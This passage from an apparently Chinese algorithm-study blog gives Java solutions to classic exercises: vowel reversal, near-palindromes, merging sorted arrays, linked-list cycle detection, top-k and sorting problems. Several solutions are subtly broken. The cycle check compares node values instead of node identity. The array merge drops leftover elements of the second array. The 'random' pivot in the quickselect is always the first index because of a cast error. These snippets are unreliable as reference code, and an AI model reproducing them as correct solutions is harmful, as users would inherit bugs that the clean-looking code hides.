href="#反转字符串中的元音" class="headerlink" title="反转字符串中的元音"></a>反转字符串中的元音</h5><ul><li>使用双指针指向待反转的两个元音字符，一个指针从头向尾遍历，一个指针从尾到头遍历。</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReverseVowelOfString</span> </span>&#123;</span><br><span class="line">    <span class="comment">//编写一个函数，该函数将字符串作为输入，并且仅反转字符串的元音。</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String str1 = solution(<span class="string">"hello"</span>);</span><br><span class="line">        String str2 = solution(<span class="string">"leetcode"</span>);</span><br><span class="line">        System.out.println(str1);</span><br><span class="line">        System.out.println(str2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">solution</span><span class="params">(String str)</span></span>&#123;</span><br><span class="line">        Set&lt;Character&gt; set = <span class="keyword">new</span> HashSet&lt;&gt;(</span><br><span class="line">            Arrays.asList(<span class="string">'a'</span>, <span class="string">'e'</span>, <span class="string">'i'</span>, <span class="string">'o'</span>, <span class="string">'u'</span>, <span class="string">'A'</span>, <span class="string">'E'</span>, <span class="string">'I'</span>, <span class="string">'O'</span>, <span class="string">'U'</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">int</span> l = <span class="number">0</span>; </span><br><span class="line">        <span class="keyword">int</span> r = str.length() - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">char</span>[] ans = <span class="keyword">new</span> <span class="keyword">char</span>[str.length()];</span><br><span class="line">        <span class="keyword">while</span>(l &lt;= r)&#123;</span><br><span class="line">            Character L = Character.valueOf(str.charAt(l));</span><br><span class="line">            Character R = Character.valueOf(str.charAt(r));</span><br><span class="line">            <span class="keyword">if</span>(!set.contains(L))&#123;</span><br><span class="line">                ans[l++] = L;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(!set.contains(R))&#123;</span><br><span class="line">                ans[r--] = R;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123; <span class="comment">//(set.contains(L) &amp;&amp; set.contains(R))</span></span><br><span class="line">                ans[l++] = R;</span><br><span class="line">                ans[r--] = L;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> String(ans);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="回文串判断"><a href="#回文串判断" class="headerlink" title="回文串判断"></a>回文串判断</h5><ul><li>题目描述：可以删除一个字符，判断是否能构成回文字符串。</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ValidPalindrome</span> </span>&#123;</span><br><span class="line">    <span class="comment">//题目描述：可以删除一个字符，判断是否能构成回文字符串。</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String str1 = <span class="string">"abba"</span>;</span><br><span class="line">        String str2 = <span class="string">"abab"</span>;</span><br><span class="line">        String str3 = <span class="string">"abbc"</span>;</span><br><span class="line">        System.out.println(check1(str1));</span><br><span class="line">        System.out.println(check1(str2));</span><br><span class="line">        System.out.println(check1(str3));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">check1</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> l = <span class="number">0</span>, r = str.length() - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>( l &lt; r)&#123;</span><br><span class="line">            <span class="keyword">if</span>(str.charAt(l) != str.charAt(r))&#123;</span><br><span class="line">                <span class="keyword">return</span> check2(str, l + <span class="number">1</span>, r) || check2(str, l, r - <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            l++;</span><br><span class="line">            r--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">check2</span><span class="params">(String str, <span class="keyword">int</span> l, <span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(l &lt; r)&#123;</span><br><span class="line">            <span class="keyword">if</span>(str.charAt(l) != str.charAt(r))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            l++;</span><br><span class="line">            r--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="归并两个有序数组"><a href="#归并两个有序数组" class="headerlink" title="归并两个有序数组"></a>归并两个有序数组</h5><ul><li>题目描述：把归并结果存到第一个数组上。</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MergeSortedArray</span> </span>&#123;</span><br><span class="line">    <span class="comment">//归并有序数组,把归并结果存到第一个数组上</span></span><br><span class="line">    <span class="comment">//注意：这题要求不使用额外空间，为了方便，从后面开始遍历，不需要交换</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] arr1 = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">1</span>, <span class="number">3</span> ,<span class="number">5</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span>[] arr2 = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">2</span>, <span class="number">4</span>&#125;;</span><br><span class="line">        solution(arr1, arr2);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i : arr1) &#123;</span><br><span class="line">            System.out.println(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">solution</span><span class="params">(<span class="keyword">int</span>[] arr1, <span class="keyword">int</span>[] arr2)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i = arr1.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> j = arr2.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> k = i - j - <span class="number">1</span>; <span class="comment">//arr1的真实size - 1</span></span><br><span class="line">        <span class="keyword">while</span>(j &gt;= <span class="number">0</span> &amp;&amp; k &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(arr1[k] &lt; arr2[j])&#123;</span><br><span class="line">                arr1[i--] = arr2[j--];</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                arr1[i--] = arr1[k--];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="判断链表是否有环"><a href="#判断链表是否有环" class="headerlink" title="判断链表是否有环"></a>判断链表是否有环</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LinkedListCycle</span></span>&#123;</span><br><span class="line">    <span class="comment">//题目：判断链表是否存在环</span></span><br><span class="line">    <span class="comment">//思路：看是否存在环</span></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Node</span></span>&#123;</span><br><span class="line">        Integer val;</span><br><span class="line">        Node next;</span><br><span class="line">        Node(Integer val)&#123;</span><br><span class="line">            <span class="keyword">this</span>.val = val;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//快慢指针</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] arr = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">1</span>, <span class="number">2</span> ,<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125;;</span><br><span class="line">        Node head =  <span class="keyword">new</span> Node(<span class="number">1</span>);</span><br><span class="line">        Node p = head;</span><br><span class="line">        Node p2 = <span class="keyword">new</span> Node(<span class="number">0</span>);</span><br><span class="line">        Node tail = <span class="keyword">new</span> Node(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; arr.length; i++)&#123;<span class="comment">//尾插法</span></span><br><span class="line">            Node temp = <span class="keyword">new</span> Node(arr[i]);</span><br><span class="line">            p.next = temp;</span><br><span class="line">            p = p.next;</span><br><span class="line">            <span class="keyword">if</span>(arr[i] == <span class="number">2</span>)&#123;</span><br><span class="line">                p2 = temp;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(arr[i] == <span class="number">6</span>)&#123;</span><br><span class="line">                tail = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//tail.next = p2; //加环</span></span><br><span class="line">        System.out.println(check(head));</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">check</span><span class="params">(Node head)</span></span>&#123;</span><br><span class="line">        Node p1 = head;</span><br><span class="line">        Node p2 = p1.next;</span><br><span class="line">        <span class="keyword">while</span>(p2 != <span class="keyword">null</span> &amp;&amp; p2.next != <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(p1.val == p2.val)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                p1 = p1.next;</span><br><span class="line">                p2 = p2.next.next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="最长子序列"><a href="#最长子序列" class="headerlink" title="最长子序列"></a>最长子序列</h5><ul><li>题目描述：删除 s 中的一些字符，使得它构成字符串列表 d 中的一个字符串，找出能构成的最长字符串。如果有多个 相同长度的结果，返回字典序的最小字符串。</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FindLongestWord</span> </span>&#123;</span><br><span class="line">    <span class="comment">//题目描述：删除 s 中的一些字符，</span></span><br><span class="line">    <span class="comment">//使得它构成字符串列表 d 中的一个字符串，找出能构成的最长字符串。如果有多个</span></span><br><span class="line">    <span class="comment">//相同长度的结果，返回字典序的最小字符串。</span></span><br><span class="line">    <span class="comment">//题解：通过删除字符串 s 中的一个字符能得到字符串 t，</span></span><br><span class="line">    <span class="comment">//可以认为 t 是 s 的子序列，我们可以使用双指针来判断一个字符串</span></span><br><span class="line">    <span class="comment">//是否为另一个字符串的子序列。</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String s = <span class="string">"abpcpleaf"</span>;</span><br><span class="line">        String[] d = <span class="keyword">new</span> String[]&#123;<span class="string">"ale"</span>, <span class="string">"apple"</span>, <span class="string">"bleaf"</span>, <span class="string">"monkey"</span>, <span class="string">"plea"</span>&#125;;</span><br><span class="line">        System.out.println(solution(s, d));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">solution</span><span class="params">(String s, String[] d)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = d.length;</span><br><span class="line">        String longMinSub = <span class="string">""</span>; <span class="comment">//最长最小字典序子串</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(isSubStr(s, d[i]))&#123;</span><br><span class="line">                String temp = d[i];</span><br><span class="line">                <span class="keyword">int</span> len1 = longMinSub.length();</span><br><span class="line">                <span class="keyword">int</span> len2 = temp.length();</span><br><span class="line">                <span class="keyword">if</span>(len1 &lt;  len2)&#123;</span><br><span class="line">                    longMinSub = temp;</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(len1 == len2)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(longMinSub.compareTo(temp) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                        longMinSub = temp;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> longMinSub;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isSubStr</span><span class="params">(String s, String target)</span></span>&#123;</span><br><span class="line">        <span class="comment">//双指针法：判断 target 是否是 s 的子串</span></span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(i &lt; s.length() &amp;&amp; j &lt; target.length())&#123;</span><br><span class="line">            <span class="keyword">if</span>(s.charAt(i) == target.charAt(j))&#123;</span><br><span class="line">                j++; <span class="comment">//j匹配上才++</span></span><br><span class="line">            &#125;</span><br><span class="line">            i++; <span class="comment">//i不管是否匹配都要++</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> j == target.length();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h4><h5 id="topk问题"><a href="#topk问题" class="headerlink" title="topk问题"></a>topk问题</h5><ul><li>题目描述：找到第 k 大的元素。</li></ul><blockquote><p>堆排法，时间复杂度 O(NlogK)，空间复杂度 O(K)。</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FindTopK</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] arr = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span> ,<span class="number">6</span> ,<span class="number">4</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span> k = <span class="number">2</span>;</span><br><span class="line">        System.out.println(find(arr, k));   </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span>[] arr, <span class="keyword">int</span> k)</span></span>&#123;</span><br><span class="line">        <span class="comment">//法1：用大根堆实现topk</span></span><br><span class="line">        <span class="keyword">int</span> len = arr.length;</span><br><span class="line">        buildMaxHeap(arr);</span><br><span class="line">        <span class="keyword">while</span>(k-- &gt; <span class="number">1</span>)&#123;</span><br><span class="line">            swap(arr, <span class="number">0</span>, len - <span class="number">1</span>);</span><br><span class="line">            heapify(arr, <span class="number">0</span>, len - <span class="number">1</span>);</span><br><span class="line">            len--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> arr[<span class="number">0</span>];       </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">buildMaxHeap</span><span class="params">(<span class="keyword">int</span>[] arr)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = arr.length;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = len/<span class="number">2</span>; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">            heapify(arr, i, len);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">heapify</span><span class="params">(<span class="keyword">int</span>[] arr, <span class="keyword">int</span> index, <span class="keyword">int</span> heapSize)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> l = <span class="number">2</span> * index + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> largeIdx = index;</span><br><span class="line">        <span class="keyword">if</span>(l &lt; heapSize &amp;&amp; arr[largeIdx] &lt; arr[l])&#123;</span><br><span class="line">            largeIdx = l;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(l + <span class="number">1</span> &lt; heapSize &amp;&amp; arr[largeIdx] &lt; arr[l + <span class="number">1</span>])&#123;</span><br><span class="line">            largeIdx = l + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(largeIdx != index)&#123;<span class="comment">//需要交换才递归</span></span><br><span class="line">            swap(arr, largeIdx, index);</span><br><span class="line">            heapify(arr, largeIdx, heapSize); </span><br><span class="line">        &#125;      </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span>[] arr, <span class="keyword">int</span> i, <span class="keyword">int</span> j)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> temp = arr[i];</span><br><span class="line">        arr[i] = arr[j];</span><br><span class="line">        arr[j] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>快排快速选择法，时间复杂度 O(N)，空间复杂度 O(1)</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FindTopK2</span> </span>&#123;</span><br><span class="line">    <span class="comment">//随机快排+三向切分partition版本</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] arr = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span> ,<span class="number">6</span> ,<span class="number">4</span>&#125;;</span><br><span class="line">        System.out.println(quickSort(arr, <span class="number">0</span>, arr.length - <span class="number">1</span>, <span class="number">1</span>));</span><br><span class="line">        System.out.println(quickSort(arr, <span class="number">0</span>, arr.length - <span class="number">1</span>, <span class="number">2</span>));</span><br><span class="line">        System.out.println(quickSort(arr, <span class="number">0</span>, arr.length - <span class="number">1</span>, <span class="number">3</span>));</span><br><span class="line">        System.out.println(quickSort(arr, <span class="number">0</span>, arr.length - <span class="number">1</span>, <span class="number">4</span>));</span><br><span class="line">        System.out.println(quickSort(arr, <span class="number">0</span>, arr.length - <span class="number">1</span>, <span class="number">5</span>));</span><br><span class="line">        System.out.println(quickSort(arr, <span class="number">0</span>, arr.length - <span class="number">1</span>, <span class="number">6</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">quickSort</span><span class="params">(<span class="keyword">int</span>[] arr, <span class="keyword">int</span> l, <span class="keyword">int</span> r, <span class="keyword">int</span> k)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> idx = l + (<span class="keyword">int</span>)Math.random() * (r - l + <span class="number">1</span>);</span><br><span class="line">        swap(arr, idx, r);</span><br><span class="line">        <span class="keyword">int</span> index = partition(arr, l, r);</span><br><span class="line">        <span class="keyword">if</span>(index &lt; arr.length - k)&#123;</span><br><span class="line">            <span class="keyword">return</span> quickSort(arr, index + <span class="number">1</span>, r, k);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(index &gt; arr.length - k)&#123;</span><br><span class="line">            <span class="keyword">return</span> quickSort(arr, l, index - <span class="number">1</span>, k);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> arr[index];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">partition</span><span class="params">(<span class="keyword">int</span>[] arr, <span class="keyword">int</span> l, <span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> less = l - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> more = r;</span><br><span class="line">        <span class="keyword">while</span>(l &lt; more)&#123;</span><br><span class="line">            <span class="keyword">if</span>(arr[l] &lt; arr[r])&#123;</span><br><span class="line">                swap(arr, ++less, l++);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(arr[l] &gt; arr[r])&#123;</span><br><span class="line">                swap(arr, --more, l);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                l++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        swap(arr, more, r);</span><br><span class="line">        <span class="keyword">return</span> more;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span>[] arr, <span class="keyword">int</span> i, <span class="keyword">int</span> j)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> temp = arr[i];</span><br><span class="line">        arr[i] = arr[j];</span><br><span class="line">        arr[j] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="出现频率最多的k个元素"><a href="#出现频率最多的k个元素" class="headerlink" title="出现频率最多的k个元素"></a>出现频率最多的k个元素</h5><ul><li>思路：和topk原理一样，只不过多一个hash表来将频率转为个数。</li></ul><blockquote><p>注意：</p><ul><li>topk （前k大）用小根堆，维护堆大小不超过 k 即可。每次压入堆前和堆顶元素比较，如果比堆顶元素还小，直接扔掉，否则压入堆。检查堆大小是否超过 k，如果超过，弹出堆顶。复杂度是 nlogk</li><li>避免使用大根堆，因为你得把所有元素压入堆，复杂度是 nlogn，而且还浪费内存。如果是海量元素，那就挂了。</li></ul><p>[注意]</p><ul><li>求前 k 大，用小根堆，求前 k 小，用大根堆。</li></ul></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TopKFrequent</span> </span>&#123;<span class="comment">//小根堆</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] nums = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span> k = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">int</span>[] ans = topKFrequent(nums, k);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i : ans) &#123;</span><br><span class="line">            System.out.println(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span>[] topKFrequent(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> k) &#123;</span><br><span class="line">        Map&lt;Integer, Integer&gt; occurrences = <span class="keyword">new</span> HashMap&lt;Integer, Integer&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num : nums) &#123;</span><br><span class="line">            occurrences.put(num, occurrences.getOrDefault(num, <span class="number">0</span>) + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//技巧：int[] 的第一个元素代表数组的值，第二个元素代表了该值出现的次数</span></span><br><span class="line">        PriorityQueue&lt;<span class="keyword">int</span>[]&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;<span class="keyword">int</span>[]&gt;(<span class="keyword">new</span> Comparator&lt;<span class="keyword">int</span>[]&gt;() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(<span class="keyword">int</span>[] m, <span class="keyword">int</span>[] n)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> m[<span class="number">1</span>] - n[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;Integer, Integer&gt; entry : occurrences.entrySet()) &#123;</span><br><span class="line">            <span class="keyword">int</span> num = entry.getKey(), count = entry.getValue();</span><br><span class="line">            <span class="keyword">if</span> (queue.size() == k) &#123;</span><br><span class="line">                <span class="keyword">if</span> (queue.peek()[<span class="number">1</span>] &lt; count) &#123;</span><br><span class="line">                    queue.poll();</span><br><span class="line">                    queue.offer(<span class="keyword">new</span> <span class="keyword">int</span>[]&#123;num, count&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                queue.offer(<span class="keyword">new</span> <span class="keyword">int</span>[]&#123;num, count&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span>[] ret = <span class="keyword">new</span> <span class="keyword">int</span>[k];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; k; ++i) &#123;</span><br><span class="line">            ret[i] = queue.poll()[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="按颜色进行排序"><a href="#按颜色进行排序" class="headerlink" title="按颜色进行排序"></a>按颜色进行排序</h5><ul><li>题目描述：只有 0/1/2 三种颜色。</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SortColor</span> </span>&#123;</span><br><span class="line">    <span class="comment">//荷兰国旗问题</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] arr = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line">        sort(arr);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i : arr) &#123;</span><br><span class="line">            System.out.println(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sort</span><span class="params">(<span class="keyword">int</span>[] arr)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> less = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> more = arr.length;</span><br><span class="line">        <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(index &lt; more)&#123;</span><br><span class="line">            <span class="keyword">if</span>(arr[index] == <span class="number">0</span>)&#123;</span><br><span class="line">                swap(arr, ++less, index++);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(arr[index] == <span class="number">2</span>)&#123;</span><br><span class="line">                swap(arr, --more, index);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                index++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span>[] arr, <span class="keyword">int</span> i ,<span class="keyword">int</span> j)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> temp = arr[i];</span><br><span class="line">        arr[i] = arr[j];</span><br><span class="line">        arr[j] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="贪心"><a href="#贪心" class="headerlink" title="贪心"></a>贪心</h4><ul><li>题目描述：每个孩子都有一个满足度，每个饼干都有一个大小，只有饼干的大小大于等于一个孩子的满足度，该孩子 才会获得满足。求解最多可以获得满足的孩子数量。</li></ul>]]></content>
      <tags>
        <tag>算法</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
